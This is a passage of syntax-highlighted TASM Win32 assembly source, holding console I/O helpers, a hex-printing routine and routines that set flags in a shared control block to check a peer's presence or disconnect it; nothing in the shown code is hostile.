    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgDiscSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgDisc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DblGtChr</span><span class="sc0">                           </span><span class="sc1">;get char</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'Y'</span><span class="sc0">                             </span><span class="sc1">;is it 'Y'</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">DiScOnNeCt</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'y'</span><span class="sc0">                             </span><span class="sc1">;is it 'y'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">
</span><span class="sc5">DiScOnNeCt</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">;ID=8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">          </span><span class="sc1">;New=1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgDiscSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgDisc</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">id_get</span><span class="sc0">

</span><span class="sc5">Check4Presency</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">                             </span><span class="sc1">;check for presency</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgCheckSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgCheck</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_ID</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;ID=0</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_New</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;load New item</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;New=1</span><span class="sc0">
</span><span class="sc5">wait_loop3</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                          </span><span class="sc1">;is New=1 ?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">wait_loop3</span><span class="sc0">                           </span><span class="sc1">;yeah, wait</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idnPresent</span><span class="sc0">              </span><span class="sc1">;load string</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc4">+</span><span class="sc5">msgCOutSize</span><span class="sc0">     </span><span class="sc1">;destination place</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.BGCB_Data</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;load Data item</span><span class="sc0">
        </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">n_present</span><span class="sc0">                         </span><span class="sc1">;is it 0 ?</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">idPresent</span><span class="sc0">               </span><span class="sc1">;no, load next string</span><span class="sc0">
</span><span class="sc5">n_present</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">;load byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                   </span><span class="sc1">;store byte</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ah</span><span class="sc0">                             </span><span class="sc1">;end of string reached ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">n_present</span><span class="sc0">                           </span><span class="sc1">;no, continue</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">msgFOutSize</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msgFOut</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">print</span><span class="sc0">                              </span><span class="sc1">;print message</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">Check4Presency</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">print</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                                  </span><span class="sc1">;print message</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">                        </span><span class="sc1">;push property parameters</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">handle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteConsoleA</span><span class="sc0">                      </span><span class="sc1">;write characters to console</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                                   </span><span class="sc1">;output</span><span class="sc0">

</span><span class="sc5">GetStd</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">10</span><span class="sc0">                                </span><span class="sc1">;get standard input</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStdHandle</span><span class="sc0">                       </span><span class="sc1">;...</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">GetChar</span><span class="sc4">:</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetStd</span><span class="sc0">                             </span><span class="sc1">;get standard input</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">temp</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">inputEvent</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ReadConsoleInputA</span><span class="sc0">                  </span><span class="sc1">;get input event</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">inputEvent</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">            </span><span class="sc1">;is it keyboard event ?</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">GetChar</span><span class="sc0">                             </span><span class="sc1">;no, get it again</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">inputEvent</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;load ascii char</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">inputEvent</span><span class="sc4">+</span><span class="sc2">14</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;reset variable</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DblGtChr</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;double get char</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetChar</span><span class="sc0">                            </span><span class="sc1">;get first char</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetChar</span><span class="sc0">                             </span><span class="sc1">;get second char</span><span class="sc0">

</span><span class="sc5">HexWrite</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;I found this procedure in</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">;TASM5 Win32 aplication</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">;writin tutorial. Very useful!</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexW16</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexW16</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HexW16</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">HexWrite8</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">HexWrite8</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3030h</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@4</span><span class="sc0">
</span><span class="sc5">@@1</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">39h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">@@3</span><span class="sc0">
</span><span class="sc5">@@2</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">@@3</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@2</span><span class="sc0">
</span><span class="sc5">@@4</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@1</span><span class="sc0">
</span><span class="sc5">HexWrite8</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">
</span><span class="sc9">ends</span><span class="sc0">
</span><span class="sc9">End</span><span class="sc0"> </span><span class="sc5">Start</span><span class="sc0">
</span></div></body>
</html>
